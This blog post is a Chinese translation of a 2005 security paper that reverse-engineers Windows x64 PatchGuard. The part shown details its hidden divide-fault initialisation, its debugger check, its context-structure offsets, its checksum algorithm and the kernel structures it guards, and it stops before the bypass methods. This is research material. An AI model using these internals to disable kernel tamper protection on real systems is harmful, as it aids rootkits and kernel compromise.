---
layout: post
title: "Bypassing PatchGuard on Windows x64 中文全译（Uninformed 第 3 卷，skape & Skywing，2005）"
categories: essay
series: uninformed
series_order: 1
---

> 整理自 Uninformed 第 3 卷（2005 年 12 月 1 日）skape（Matt Miller）与 Skywing（Ken Johnson）的《Bypassing PatchGuard on Windows x64》全文翻译——第一份把 PatchGuard 的上下文结构、校验清单完整逆向出来的公开文献，也是《PatchGuard 攻防史》的事实底座之一（在该文中亦作附录二收录）。三部曲顺序：其一（本文，第 1 版）→ 其二《Subverting PatchGuard Version 2》→ 其三《PatchGuard Reloaded》（第 3 版）。原文：http://www.uninformed.org/?v=3&a=3&t=txt

---

作者：skape & Skywing

> 译者注：原文《Bypassing PatchGuard on Windows x64》，作者 skape 与 Skywing，发表于安全技术期刊《Uninformed》第 3 卷（Vol 3），日期 2005 年 12 月 1 日。原文链接：http://www.uninformed.org/?v=3&a=3&t=txt 。本译文为全文翻译，不删节、不摘要化；代码、函数名、结构名、数值、寄存器名保持原文；专有名词首次出现时给出中文说明。PatchGuard（补丁卫士）：微软在 Windows x64 内核中引入的内核补丁保护机制，正式名称 Kernel Patch Protection。

## 1) Foreword / 前言

摘要：在 x64 平台上运行的 Windows 内核引入了一项新特性，绰号 PatchGuard，旨在阻止恶意软件和第三方厂商修改某些关键的操作系统结构。这些结构包括特定的系统映像、SSDT（System Service Descriptor Table，系统服务描述符表）、IDT（Interrupt Descriptor Table，中断描述符表）、GDT（Global Descriptor Table，全局描述符表），以及某些关键的处理器 MSR（Model-Specific Register，型号特定寄存器）。这项特性的目的是通过阻止未经认可的行为（例如挂钩 hooking）来确保内核稳定性。然而，它也有一个副作用：妨碍合法产品正常工作。为此，本文将深入分析 PatchGuard 的内部工作原理，着眼于可用于绕过它的技术。本文还将针对所提出的绕过技术提出可能的解决方案。

致谢：作者感谢 westcose、bugcheck、uninformed、Alex Ionescu、Filip Navara，以及每一位出于自身求知兴趣而有动力学习的人。

免责声明（Disclaimer）：本文所讨论的内容仅出于教育目的而呈现。作者不对这些信息被如何使用负责。作者已尽力使分析尽可能详尽，但仍有可能出现一处或多处错误。如发现错误，请联系作者中的一位或两位，以便更正。

## 2) Introduction / 引言

在操作系统的种姓制度里，内核是王。像大多数王一样，内核能通过特权分离这道城墙，抵御用户模式进程这类地位较低的臣民。然而，与大多数王不同的是，内核通常无法抵御与它自身处于同一特权级的对手。内核若不能在自己的特权级上保护其要害器官，只要有任何代码能以与内核相同的特权运行，整个操作系统就会任人修改与颠覆。

时至今日，大多数内核实现都不提供这样一种机制：校验内核的关键部分，以确保它们未被篡改。如果现有内核试图事后部署这类东西，可以预见会在兼容性方面遇到大量问题。多数内核有意不公开其内部设计如何运作——例如系统调用分发如何工作——但很可能至少有一家或多家第三方厂商依赖于这些未公开实现的某些明确行为。

微软的操作系统正是如此。早在 Windows 95 时代、甚至可能更早，微软就意识到：允许第三方厂商摆弄或以其他方式玩弄内核的各个关键部分，只会带来无尽的头疼和稳定性问题，尽管这提供了最高程度的灵活性。微软在 Windows NT 上采取了更强硬的立场，但情况仍然演变成：第三方厂商会使用内核中对完成某些事情特别有用的区域，尽管完成这些事情的手段需要使用未公开的结构和函数。

微软很可能早就意识到自己的命运：他们已经失去了对内核内部改动范围与类型的控制，无法在不影响第三方厂商的情况下自由改动，但他们能对此做些什么的能力却受到极大限制。如果微软部署的代码恰好阻止了主要第三方厂商在没有提供充分替代方案的情况下实现其目标，微软就会陷入一个多半与"反垄断"押韵的大麻烦。尽管局面看似黯淡，微软还是随着 x64 架构的引入得到了收回内核更高灵活性的机会。有些地方用 x64 同时指 AMD64 和 IA64，本文一般将 x64 作为仅指 AMD64 的别名，尽管许多评论也可能适用于 IA64。由于 x64 架构上的 Windows 内核运行在 64 位模式下，顺理成章地，所有内核模式驱动也必须编译为在原生 64 位模式下运行。造成这一点的原因有很多，超出本文范围，但只需说明一点：试图为那些多少要考虑性能的设备驱动设计一个转译层（thunking layer），就足以说明这样做会是一个可怕的主意。

通过要求所有设备驱动都原生编译为 64 位二进制，微软实际上在新平台上抹平了起跑线，让一切回到一张白纸。这使他们不必担心与现有产品的潜在兼容性冲突，因为事实很简单：那时还没有任何已确立的产品。随着第三方厂商把设备驱动移植到 64 位模式，驱动方面任何不受支持或未获认可的行为，都可以被记录为在 x64 架构上被禁止，从而迫使第三方去寻找替代办法（如果可能的话）。这就是微软的反补丁保护系统 PatchGuard 的梦想。这样的目标看起来合乎逻辑、也合乎情理，但这不是本文的要点。

相反，本文将聚焦于 x64 内核中那些旨在保护 Windows 内核关键部分不被修改的改动。本文将描述这些保护机制如何实现、内核的哪些区域受到保护。在此基础上，将详细解释几种可用于禁用和绕过这些保护机制的不同方法，以及针对这些绕过技术的潜在解决方案。最后，将总结其原因与动机，并讨论针对这个更根本问题的其他解决方案。

不过，本文真正的目的是说明：通过一个在与第三方代码相同的特权级上监视代码与数据区域的系统，来安全地保护这些区域，是不可能做到的。这一事实是众所周知的，微软和整个安全界都清楚，无需解释也应当被理解。展望未来，操作系统世界很可能开始转向更细粒度的、由硬件强制的特权分离，即实现相互隔离的可信代码库。这将引发的有关开源操作系统和 DRM（数字版权管理）的问题，应当会慢慢增多。唯有时间能给出答案。

## 3) Implementation / 实现

Windows x64 内核提供的反补丁技术，绰号 PatchGuard，旨在保护关键内核结构不被在获批准的修改上下文之外修改，例如通过微软控制的热补丁（hot patching）进行修改。在本文写作时，PatchGuard 设计用于保护以下关键结构：

- SSDT（System Service Descriptor Table，系统服务描述符表）
- GDT（Global Descriptor Table，全局描述符表）
- IDT（Interrupt Descriptor Table，中断描述符表）
- 系统映像（ntoskrnl.exe、ndis.sys、hal.dll）
- 处理器 MSR（syscall）

在高层面上，PatchGuard 以一组例程的形式实现：它们缓存已知良好的结构副本和/或校验和，然后在某些随机时间间隔（大致每 5 到 10 分钟）对这些结构进行校验。PatchGuard 采用轮询方式而不是事件驱动或硬件支撑的方式实现，是因为对于 PatchGuard 试图完成的事情，并不存在原生的硬件级支持。正因如此，PatchGuard 所诉诸的许多技巧都是出于必要。

做 PatchGuard 的团队无疑非常聪明。他们意识到以引言所述方式实现反补丁模型的局限性，于是被迫诉诸其他手段来增强保护机制。特别是，PatchGuard 大量使用"以隐蔽求安全"（security through obscurity）的做法，采用诸如误导、函数误命名和一般性的代码混淆等策略。许多人会争辩说以隐蔽求安全毫无作用，但作者认为，这只是一个把门槛抬高到足够程度的问题——高到足以让相当多的人无法完全理解某个东西。

初始化 PatchGuard 的代码在启动过程早期、作为 nt!KeInitSystem 的一部分开始。而有趣的事情正是从这里开始的。

### 3.1) Initializing PatchGuard / 初始化 PatchGuard

PatchGuard 的初始化是多方面的，但一切总要有个起点。在这里，PatchGuard 的初始化始于一个符号名与反补丁保护毫无关系的函数。事实上，它名为 KiDivide6432，它唯一做的事情就是一个除法运算，如下面代码所示：

```
ULONG KiDivide6432(
    IN ULONG64 Dividend,
    IN ULONG Divisor)
{
    return Dividend / Divisor;
}
```

这个函数看上去可能人畜无害，但它实际上是 PatchGuard 第一次试图用误导来隐藏其真实意图。在这里，对 nt!KiDivide6432 的调用传入的被除数来自 nt!KiTestDividend。除数被硬编码为 0xcb5fa3。这个函数看上去意在伪装成某种除法测试，确保底层架构支持除法运算。如果对该函数的调用没有返回预期结果 0x5ee0b7e5，nt!KeInitSystem 将以错误检查代码 0x5d（即 UNSUPPORTED_PROCESSOR）让操作系统蓝屏（bug check），如下所示：

```
nt!KeInitSystem+0x158:
fffff800`014212c2 488b0d1754d5ff   mov     rcx,[nt!KiTestDividend]
fffff800`014212c9 baa35fcb00       mov     edx,0xcb5fa3
fffff800`014212ce e84d000000       call    nt!KiDivide6432
fffff800`014212d3 3de5b7e05e       cmp     eax,0x5ee0b7e5
fffff800`014212d8 0f8519b60100     jne     nt!KeInitSystem+0x170

...

nt!KeInitSystem+0x170:
fffff800`0143c8f7 b95d000000       mov     ecx,0x5d
fffff800`0143c8fc e8bf4fc0ff       call    nt!KeBugCheck
```

用本地 kd 附着时，发现 nt!KiTestDividend 的值被硬编码为 0x014b5fa3a053724c，这样做除法运算——0x014b5fa3a053724c 除以 0xcb5fa3——得到 0x1a11f49ae。这不对劲吧？显然，上面的代码表明，任何不等于 0x5ee0b7e5 的值都会导致蓝屏；但同样明显的是，机器在启动时并不会蓝屏。那么这里到底发生了什么？

答案涉及一桩老派的巧思。上面除法运算的结果是一个大于 32 位的值。AMD64 指令集参考手册指出，当商溢出时，div 指令将产生除法错误故障（divide error fault）。这意味着，只要 nt!KiTestDividend 被设为上面所述的值，就会触发一个除法错误故障，造成一个必须由内核处理的硬件异常。正是这个除法错误故障，实际上导致了 PatchGuard 子系统的间接初始化。不过，在走这条路之前，重要的是理解微软这样做的一个有趣之处。

nt!KiTestDividend 有趣的一点是，它实际上与一个导出符号共用存储（unioned），该符号用于指示调试器是否在场。这个符号名为 nt!KdDebuggerNotPresent，它与 nt!KiTestDividend 的高位字节重叠，如下所示：

```
TestDividend L1
fffff800`011766e0  014b5fa3`a053724c
lkd> db nt!KdDebuggerNotPresent L1
fffff800`011766e7  01
```

如果有调试器在场，全局变量 nt!KdDebuggerNotPresent 将被设为零。如果没有调试器在场，其值为一（默认值）。如果在启动期间有调试器附着到系统时执行上述除法运算——这相当于用 0x004b5fa3a053724c 除以 0xcb5fa3——得到的商将是预期值 0x5ee0b7e5。这意味着，如果在 PatchGuard 保护被间接初始化之前有调试器附着到系统，那么保护将不会被初始化，因为除法错误故障不会被触发。这与已记录的行为相符，其意图是允许驱动程序开发者在调试环境中继续能够设置断点并执行其他可能间接修改内核受监视区域的操作。然而，这只在调试器于启动期间附着到系统时才有效。如果开发者随后在 PatchGuard 已初始化之后再附着调试器，那么设置断点或执行其他操作的行为可能会导致蓝屏，因为 PatchGuard 会检测到这些更改。微软选择以这种方式初始化 PatchGuard，使它能在有调试器附着时透明地禁用保护，同时也充当隐藏真正初始化向量（initialization vector）的一种手段。

理解了 nt!KiTestDividend 的共用存储之后，下一步是理解除法错误故障实际上如何导致 PatchGuard 子系统的初始化。为此，有必要从所有除法错误故障都会去的地方开始：nt!KiDivideErrorFault。

对 nt!KiDivideErrorFault 的间接触发导致一系列函数调用，最终调用 nt!KiOpDiv 来处理 div 指令的除法错误故障。nt!KiOpDiv 例程看似负责对不同种类的除法错误（如除以零）做预处理。虽然乍看之下它似乎正常，但 nt!KiOpDiv 也有一面更黑暗的侧面。导致 nt!KiOpDiv 被调用的栈回溯如下所示。对于那些好奇作者如何能调试这个意在有调试器附着时被禁用的 PatchGuard 初始化向量的人来说，一种方法就是简单地在 nt!KiDivide6432 中的 div 指令处断下，并把 r8d 改为零。这将产生除法错误故障并导致 PatchGuard 初始化例程被调用。为了让机器能正常启动，事后必须在 nt!KiDivide6432 上设置一个断点，自动把 r8d 恢复为 0xcb5fa3：

```
kd> k
Child-SP          RetAddr           Call Site
fffffadf`e4a15f90 fffff800`010144d4 nt!KiOp_Div+0x29
fffffadf`e4a15fe0 fffff800`01058d75 nt!KiPreprocessFault+0xc7
fffffadf`e4a16080 fffff800`0104172f nt!KiDispatchException+0x85
fffffadf`e4a16680 fffff800`0103f5b7 nt!KiExceptionExit
fffffadf`e4a16800 fffff800`0142132b nt!KiDivideErrorFault+0xb7
fffffadf`e4a16998 fffff800`014212d3 nt!KiDivide6432+0xb
fffffadf`e4a169a0 fffff800`0142a226 nt!KeInitSystem+0x169
fffffadf`e4a16a50 fffff800`01243e09 nt!Phase1InitializationDiscard+0x93e
fffffadf`e4a16d40 fffff800`012b226e nt!Phase1Initialization+0x9
fffffadf`e4a16d70 fffff800`01044416 nt!PspSystemThreadStartup+0x3e
fffffadf`e4a16dd0 00000000`00000000 nt!KxStartSystemThread+0x16
```

nt!KiOpDiv 在处理实际的除法故障之前做的第一件事，是调用一个名为 nt!KiFilterFiberContext 的函数。这个函数的名字不仅在一般意义上显得奇怪，在一个本应处理除法故障的例程的具体上下文中也同样奇怪。通过查看 nt!KiFilterFiberContext 的函数体，它的意图很快就清楚了：

```
nt!KiFilterFiberContext:
fffff800`01003ac2 53               push    rbx
fffff800`01003ac3 4883ec20         sub     rsp,0x20
fffff800`01003ac7 488d0552d84100   lea     rax,[nt!KiDivide6432]
fffff800`01003ace 488bd9           mov     rbx,rcx
fffff800`01003ad1 4883c00b         add     rax,0xb
fffff800`01003ad5 483981f8000000   cmp     [rcx+0xf8],rax
fffff800`01003adc 0f855d380c00     jne     nt!KiFilterFiberContext+0x1d
fffff800`01003ae2 e899fa4100       call    nt!KiDivide6432+0x570
```

看来这段代码旨在查看故障发生的地址是否等于 nt!KiDivide6432 + 0xb。如果把 0xb 加到 nt!KiDivide6432 上并反汇编该地址处的指令，结果是：

```
nt!KiDivide6432+0xb:
fffff800`0142132b 41f7f0           div     r8d
```

这与商溢出条件发生时人们会预期的情形相符。根据上面的反汇编，如果故障地址等于 nt!KiDivide6432 + 0xb，那么将调用位于 nt!KiDivide6432 + 0x570 的一个未命名符号。这个未命名符号今后将被称作 nt!KiInitializePatchGuard，它正是驱动 PatchGuard 子系统建立的东西。

nt!KiInitializePatchGuard 例程本身相当庞大。它负责初始化将监视某些系统映像、SSDT、处理器 GDT/IDT、某些关键 MSR 以及某些与调试器相关的例程的上下文。这个初始化例程做的第一件事，是检查机器是否正在以安全模式启动。如果正在以安全模式启动，PatchGuard 子系统将不会被启用，如下所示：

```
nt!KiDivide6432+0x570:
fffff800`01423580 4881ecd8020000   sub     rsp,0x2d8
fffff800`01423587 833d22dfd7ff00   cmp     dword ptr [nt!InitSafeBootMode],0x0
fffff800`0142358e 0f8504770000     jne     nt!KiDivide6432+0x580

...

nt!KiDivide6432+0x580:
fffff800`0142ac98 b001             mov     al,0x1
fffff800`0142ac9a 4881c4d8020000   add     rsp,0x2d8
fffff800`0142aca1 c3               ret
```

安全模式检查通过之后，nt!KiInitializePatchGuard 通过计算 ntoskrnl.exe 中 INITKDBG 节的大小来开始 PatchGuard 的初始化。它通过把位于该节内的一个符号 nt!FsRtlUninitializeSmallMcb 的地址传给 nt!RtlPcToFileHeader 来完成这一点。该例程通过一个输出参数传回 nt 的基址，该基址随后被传给 nt!RtlImageNtHeader。这个方法返回一个指向该映像的 IMAGE_NT_HEADERS 结构的指针。在此基础上，用 nt!FsRtlUninitializeSmallMcb 的虚拟地址减去 nt 的基址，计算出它的 RVA（Relative Virtual Address，相对虚拟地址）。计算出的 RVA 随后被传给 nt!RtlSectionTableFromVirtualAddress，它返回一个指向 nt!FsRtlUninitializeSmallMcb 所在的映像节的指针。下面的调试器输出显示了在获得映像节结构之后 rax 指向什么：

```
kd> ? rax
Evaluate expression: -8796076244456 = fffff800`01000218
kd> dt nt!_IMAGE_SECTION_HEADER fffff800`01000218
+0x000 Name             : [8]  "INITKDBG"
+0x008 Misc             : <unnamed-tag>
+0x00c VirtualAddress   : 0x165000
+0x010 SizeOfRawData    : 0x2600
+0x014 PointerToRawData : 0x163a00
+0x018 PointerToRelocations : 0
+0x01c PointerToLinenumbers : 0
+0x020 NumberOfRelocations : 0
+0x022 NumberOfLinenumbers : 0
+0x024 Characteristics  : 0x68000020
```

这个最初的映像节查找背后的全部原因，与 PatchGuard 混淆和隐藏其所执行代码的方式之一有关。在这里，INITKDBG 节内的代码最终将被复制到一个已分配的保护上下文中，该上下文将在校验阶段被使用。这样做为什么必要，稍后将更详细地讨论。

收集了 INITKDBG 映像节的信息之后，PatchGuard 初始化例程执行许多次伪随机数生成中的第一次。这段代码在 PatchGuard 的各个函数中随处可见，其形式与下面所示代码类似：

```
fffff800`0142362d 0f31                 rdtsc
fffff800`0142362f 488bac24d8020000     mov     rbp,[rsp+0x2d8]
fffff800`01423637 48c1e220             shl     rdx,0x20
fffff800`0142363b 49bf0120000480001070 mov     r15,0x7010008004002001
fffff800`01423645 480bc2               or      rax,rdx
fffff800`01423648 488bcd               mov     rcx,rbp
fffff800`0142364b 4833c8               xor     rcx,rax
fffff800`0142364e 488d442478           lea     rax,[rsp+0x78]
fffff800`01423653 4833c8               xor     rcx,rax
fffff800`01423656 488bc1               mov     rax,rcx
fffff800`01423659 48c1c803             ror     rax,0x3
fffff800`0142365d 4833c8               xor     rcx,rax
fffff800`01423660 498bc7               mov     rax,r15
fffff800`01423663 48f7e1               mul     rcx
fffff800`01423666 4889442478           mov     [rsp+0x78],rax
fffff800`0142366b 488bca               mov     rcx,rdx
fffff800`0142366e 4889942488000000     mov     [rsp+0x88],rdx
fffff800`01423676 4833c8               xor     rcx,rax
fffff800`01423679 48b88fe3388ee3388ee3 mov     rax,0xe38e38e38e38e38f
fffff800`01423683 48f7e1               mul     rcx
fffff800`01423686 48c1ea03             shr     rdx,0x3
fffff800`0142368a 488d04d2             lea     rax,[rdx+rdx*8]
fffff800`0142368e 482bc8               sub     rcx,rax
fffff800`01423691 8bc1                 mov     eax,ecx
```

这个伪随机数生成器使用 rdtsc 指令（读取时间戳计数器）作为种子，然后执行各种按位与乘法运算，直到最终结果在 eax 中产生。这个第一个随机数生成器的结果被用来索引一个池标签（pool tag）数组，这些标签用于 PatchGuard 的内存分配。这是 PatchGuard 试图使在内存中找到其自身内部数据结构变得更难的众多方式之一的例子。在这里，它采用一个随机的合法池标签，努力与其他的内存分配混在一起。下面的代码块显示了池标签数组是如何被索引的，以及它在内存中的何处可以找到：

```
fffff800`01423693 488d0d66c9bdff   lea     rcx,[nt]
fffff800`0142369a 448b848100044300 mov     r8d,[rcx+rax*4+0x430400]
```

在这里，随机数存放在 rax 寄存器中，用来索引位于 nt+0x430400 处的池标签数组。这个数组被间接引用的事实，可以被看作另一种混淆尝试，目的是让乍看之下正在发生的事情不那么明显。如果在调试器中把池标签数组的地址转储出来，就能看到 PatchGuard 可能使用的所有池标签：

```
lkd> db nt+0x430400
41 63 70 53 46 69 6c 65-49 70 46 49 49 72 70 20  AcpSFileIpFIIrp
4d 75 74 61 4e 74 46 73-4e 74 72 66 53 65 6d 61  MutaNtFsNtrfSema
54 43 50 63 00 00 00 00-10 3b 03 01 00 f8 ff ff  TCPc.....;......
```

从数组中随机选出假池标签之后，PatchGuard 初始化例程接着分配一段随机大小的存储空间：其下限为 INITKDBG 节的虚拟大小加 0x1b8，上限为下限加 0x7ff。最小大小中出现的魔数 0x1b8，实际上正是 PatchGuard 用来存储上下文特定保护信息的数据结构的大小，稍后将展示。假池标签和随机大小随后被用来从非分页池（NonPagedPool）分配存储，如下面的伪代码所示：

```
Context = ExAllocatePoolWithTag(
    NonPagedPool,
    (InitKdbgSection->VirtualSize + 0x1b8) + (RandSize & 0x7ff),
    PoolTagArray[RandomPoolTagIndex]);
```

如果上下文分配成功，初始化例程将其内容清零，然后开始初始化该结构的一些属性。分配返回的上下文今后将被称作一个 PATCHGUARD_CONTEXT 类型的结构。该结构的前 0x48 字节实际上由从那个误导性命名的符号 nt!CmpAppendDllSection 复制来的代码构成。这个函数实际上用于在运行时解密该结构，稍后将看到。在 nt!CmpAppendDllSection 被复制到数据结构的前 0x48 字节之后，初始化例程设置了一批存放在该结构内部的函数指针。它存放了地址的例程及其在 PatchGuard 上下文数据结构中的偏移如下所示。

```
  +--------+-------------------------------------------+
  | Offset | Symbol                                    |
  +--------+-------------------------------------------+
  | 0x48   | nt!ExAcquireResourceSharedLite            |
  | 0x50   | nt!ExAllocatePoolWithTag                  |
  | 0x58   | nt!ExFreePool                             |
  | 0x60   | nt!ExMapHandleToPointer                   |
  | 0x68   | nt!ExQueueWorkItem                        |
  | 0x70   | nt!ExReleaseResourceLite                  |
  | 0x78   | nt!ExUnlockHandleTableEntry               |
  | 0x80   | nt!ExAcquireGuardedMutex                  |
  | 0x88   | nt!ObDereferenceObjectEx                  |
  | 0x90   | nt!KeBugCheckEx                           |
  | 0x98   | nt!KeInitializeDpc                        |
  | 0xa0   | nt!KeLeaveCriticalRegion                  |
  | 0xa8   | nt!KeReleaseGuardedMutex                  |
  | 0xb0   | nt!ObDereferenceObjectEx2                 |
  | 0xb8   | nt!KeSetAffinityThread                    |
  | 0xc0   | nt!KeSetTimer                             |
  | 0xc8   | nt!RtlImageDirectoryEntryToData           |
  | 0xd0   | nt!RtlImageNtHeaders                      |
  | 0xd8   | nt!RtlLookupFunctionEntry                 |
  | 0xe0   | nt!RtlSectionTableFromVirtualAddress      |
  | 0xe8   | nt!KiOpPrefetchPatchCount                 |
  | 0xf0   | nt!KiProcessListHead                      |
  | 0xf8   | nt!KiProcessListLock                      |
  | 0x100  | nt!PsActiveProcessHead                    |
  | 0x108  | nt!PsLoadedModuleList                     |
  | 0x110  | nt!PsLoadedModuleResource                 |
  | 0x118  | nt!PspActiveProcessMutex                  |
  | 0x120  | nt!PspCidTable                            |
  +--------+-------------------------------------------+

          PATCHGUARD_CONTEXT function pointers
          （PATCHGUARD_CONTEXT 的函数指针表）
```

PatchGuard 使用函数指针而不是直接调用符号，原因很可能在于 x64 所用的相对寻址模式。由于 PatchGuard 代码从不可预测的地址动态运行，不做指令修复就无法使用相对寻址模式——那无疑将是一项痛苦且不值得的任务。作者看不出把函数指针存放在 PatchGuard 上下文结构中在混淆方面带来任何特别的好处。

所有函数指针都设置完毕之后，初始化例程接着挑选另一个随机池标签，用于后续的分配，并将其存放在 PatchGuard 上下文结构内偏移 0x188 处。此后，又生成两个随机数，两者都将在该结构的加密阶段被使用。一个用作随机旋转位数（rotate bits），另一个用作 XOR（异或）种子。XOR 种子存放在偏移 0x190 处，随机旋转位数值存放在偏移 0x18c 处。

初始化例程采取的下一步，是通过 cpuid 的 ExtendedAddressSize（0x80000008）扩展功能查询处理器，获取可用于表示虚拟地址空间的位数。其结果存放在 PatchGuard 上下文结构内偏移 0x1b4 处。

最后，在初始化各个单独的保护子上下文之前的最后一个主要步骤，是把 INITKDBG 节的内容复制到已分配的 PatchGuard 上下文结构中。复制操作看上去像下面的伪代码：

```
memmove(
    (PCHAR)PatchGuardContext + sizeof(PATCHGUARD_CONTEXT),
    NtImageBase + InitKdbgSection->VirtualAddress,
    InitKdbgSection->VirtualSize);
```

PatchGuard 上下文结构的主要部分初始化完毕之后，下一个合乎逻辑的步骤，就是初始化那些针对实际受保护对象的子上下文。

### 3.2) Protected Structure Initialization / 受保护结构的初始化

PatchGuard 所保护的结构，由单独的子上下文结构来表示。这些结构在开端由父 PatchGuard 结构（PATCHGUARD_CONTEXT）的内容构成。这包括分配给父结构的函数指针和其他值。子上下文由通用类型加以标识，为校验例程提供可据以判断的依据。

本节将解释每个单独的结构其保护子上下文是如何初始化的。在本文写作时，这些结构按下面所述的顺序初始化其保护子上下文：

- 系统映像（System images）
- SSDT
- GDT/IDT/MSR
- 调试例程（Debug routines）

所有子上下文都初始化完毕之后，父保护上下文被 XOR 处理，并初始化和设置一个定时器（timer）。这个定时器的目的，如将要展示的，是对所收集的数据运行 PatchGuard 子系统的校验那一半。除了后面小节所列的特定保护子上下文之外，作者还观察到，初始化 PatchGuard 子系统的例程还分配了类型一时无法辨明的子上下文结构。特别是，这些类型的子上下文标识符为 0x4 和 0x5。

#### 3.2.1) System Images / 系统映像

保护某些关键内核映像是 PatchGuard 保护方案中较关键的方面之一。如果一个驱动仍能挂钩 nt、ndis 或任何其他关键内核组件中的函数，那么 PatchGuard 大多就无关紧要了。为了解决这一担忧，PatchGuard 执行一组操作，旨在确保系统映像不能被篡改。下表显示了当前受此方案保护的内核映像。

```
         +--------------+
         | Image Name   |
         +--------------+
         | ntoskrnl.exe |
         | hal.dll      |
         | ndis.sys     |
         +--------------+

      Protected kernel images
      （受保护的内核映像）
```

保护这些映像中每一个所采取的方法都是相同的。开头，一个位于该映像内部的符号地址被传给一个 PatchGuard 子例程，它将被称作 nt!PgCreateImageSubContext。该例程的原型如下所示：

```
NTSTATUS PgCreateImageSubContext(
    IN PPATCHGUARD_CONTEXT ParentContext,
    IN LPVOID SymbolAddress);
```

对于 ntoskrnl.exe，传入的符号地址是 nt!KiFilterFiberContext 的地址。对于 hal.dll，传入 HalInitializeProcessor 的地址。最后，为 ndis.sys 传入的是它的入口点地址，该地址通过调用 nt!GetModuleEntryPoint 获得。

在 nt!PgCreateImageSubContext 内部，保护这些映像的基本方法，是生成几个不同的 PatchGuard 子上下文。第一个子上下文设计用于保存单个映像各节的校验和，有几个例外。第二和第三个子上下文分别保存一个映像的导入地址表（Import Address Table，IAT）和导入目录（Import Directory）的校验和。这些例程都使用一个共享例程，该例程负责生成一个保护子上下文：它使用存放在父 PatchGuard 上下文结构中的随机 XOR 密钥和随机旋转位数，对一块内存生成校验和。这个例程的原型如下所示：

```
typedef struct BLOCK_CHECKSUM_STATE
{
    ULONG   Unknown;
    ULONG64 BaseAddress;
    ULONG   BlockSize;
    ULONG   Checksum;
} BLOCK_CHECKSUM_STATE, *PBLOCK_CHECKSUM_STATE;

PPATCHGUARD_SUB_CONTEXT PgCreateBlockChecksumSubContext(
    IN PPATCHGUARD_CONTEXT Context,
    IN ULONG Unknown,
    IN PVOID BlockAddress,
    IN ULONG BlockSize,
    IN ULONG SubContextSize,
    OUT PBLOCK_CHECKSUM_STATE ChecksumState OPTIONAL);
```

块校验和子上下文把校验和状态存放在 PATCHGUARD_CONTEXT 的末尾。校验和状态存放在一个 BLOCK_CHECKSUM_STATE 结构中。该结构的 Unknown 属性被初始化为来自 nt!PgCreateBlockChecksumSubContext 的 Unknown 参数。这个字段的用途没有被推断出来，但在调试期间其值被设为零。

该例程所用的校验和算法相当简单。下面的伪代码从概念上显示了它如何工作：

```
ULONG64 Checksum = Context->RandomHashXorSeed;
ULONG   Checksum32;

// Checksum 64-bit blocks
while (BlockSize >= sizeof(ULONG64))
{
    Checksum    ^= *(PULONG64)BaseAddress;
    Checksum     = RotateLeft(Checksum, Context->RandomHashRotateBits);
    BlockSize   -= sizeof(ULONG64);
    BaseAddress += sizeof(ULONG64);
}

// Checksum aligned blocks
while (BlockSize-- > 0)
{
    Checksum    ^= *(PUCHAR)BaseAddress;
    Checksum     = RotateLeft(Checksum, Context->RandomHashRotateBits);
    BaseAddress++;
}

Checksum32 = (ULONG)Checksum;

Checksum >>= 31;

do
{
    Checksum32  ^= (ULONG)Checksum;
    Checksum   >>= 31;
} while (Checksum);
```

最终结果是，Checksum32 保存了该块的校验和，它随后连同传给函数的原始块大小和块基址一起，被存入校验和状态结构的 Checksum 属性。

为了初始化映像各节的校验和，nt!PgCreateImageSubContext 调用 nt!PgCreateImageSectionSubContext，其原型为：

```
PPATCHGUARD_SUB_CONTEXT PgCreateImageSectionSubContext(
    IN PPATCHGUARD_CONTEXT ParentContext,
    IN PVOID SymbolAddress,
    IN ULONG SubContextSize,
    IN PVOID ImageBase);
```

这个例程首先检查 nt!KiOpPrefetchPatchCount 是否为零。如果不为零，就会创建一个不覆盖该映像全部节的块校验和上下文。这大概可能与检测是否已应用热补丁有关，但这一点尚未得到证实。否则，该函数看上去会枚举所提供映像中包含的各个节，跨每个节计算校验和。它看上去排除了名为 INIT、PAGEVRFY、PAGESPEC 和 PAGEKD 的节的校验和。

为了处理一个映像的导入地址表和导入目录，nt!PgCreateImageSubContext 对这两者的目录项调用 nt!PgCreateBlockChecksumSubContext，但前提是这些目录项对所提供的映像存在且有效。

#### 3.2.2) GDT/IDT / 全局与中断描述符表

保护全局描述符表（GDT）和中断描述符表（IDT），是 PatchGuard 的另一个重要特性。GDT 用于描述内核所使用的内存段。它对恶意应用特别有吸引力，因为修改某些关键 GDT 表项可能导致非特权的用户模式应用能够修改内核内存。IDT 也很有用，无论是在恶意上下文还是合法上下文中。在某些情况下，第三方可能希望拦截某些硬件或软件中断，然后再把它交给内核。除非做得正确，否则挂钩 IDT 表项可能非常危险，因为在中断请求处理程序的上下文中运行时必须考虑诸多因素。

GDT/IDT 保护的实际实现，是通过使用 nt!PgCreateBlockChecksumSubContext 函数来完成的，向它传入两个描述符表的内容。由于保存 GDT 和 IDT 的寄存器是相对于某个给定处理器而言的，PatchGuard 为每个处理器上的每张表创建一个单独的上下文。为了获得给定处理器的 GDT 和 IDT 地址，PatchGuard 首先使用 nt!KeSetAffinityThread 确保它运行在某个特定处理器上。之后，它调用 nt!KiGetGdtIdt，该函数把 GDT 和 IDT 的基址作为输出参数存放，如下面原型所示：

```
VOID KiGetGdtIdt(
    OUT PVOID *Gdt,
    OUT PVOID *Idt);
```

GDT 和 IDT 的实际保护在两个单独函数的上下文中完成，它们被标记为 nt!PgCreateGdtSubContext 和 PgCreateIdtSubContext。这些例程的原型如下所示：

```
PPATCHGUARD_SUB_CONTEXT PgCreateGdtSubContext(
    IN PPATCHGUARD_CONTEXT ParentContext,
    IN UCHAR ProcessorNumber);


PPATCHGUARD_SUB_CONTEXT PgCreateIdtSubContext(
    IN PPATCHGUARD_CONTEXT ParentContext,
    IN UCHAR ProcessorNumber);
```

这两个例程都是在一个循环的上下文中被调用的，该循环按 nt!KeNumberProcessors 遍历机器上的所有处理器。

#### 3.2.3) SSDT / 系统服务描述符表

最臭名昭著地被第三方驱动挂钩的区域之一，是系统服务描述符表，也称 SSDT。这张表包含操作系统用于分发系统调用的服务表的信息。在 Windows x64 内核上，nt!KeServiceDescriptorTable 传达实际分发表的地址以及原生系统调用接口的分发表中的表项数目。在这里，实际的分发表以相对偏移数组的形式存放在 nt!KiServiceTable 中。这些偏移是相对于数组本身、使用相对寻址的。要获得系统服务例程的绝对地址，可以使用以下方法：

```
lkd> u dwo(nt!KiServiceTable)+nt!KiServiceTable L1
nt!NtMapUserPhysicalPagesScatter:
fffff800`013728b0 488bc4           mov     rax,rsp
lkd> u dwo(nt!KiServiceTable+4)+nt!KiServiceTable L1
nt!NtWaitForSingleObject:
fffff800`012b83a0 4c89442418       mov     [rsp+0x18],r8
```

